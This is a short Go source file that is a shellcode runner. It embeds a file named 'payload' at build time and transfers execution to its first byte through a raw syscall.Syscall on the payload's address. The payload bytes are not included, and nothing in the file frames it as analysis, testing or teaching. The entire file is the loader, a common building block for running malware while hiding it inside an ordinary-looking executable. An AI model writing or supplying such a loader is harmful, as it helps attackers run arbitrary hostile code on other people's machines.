package main

import (
	_ "embed"
	"syscall"
	"unsafe"
)

var (
	//go:embed "payload"
	payload []byte
)

func main() {
	syscall.Syscall(uintptr(unsafe.Pointer(&payload[0])), 0, 0, 0, 0)
}
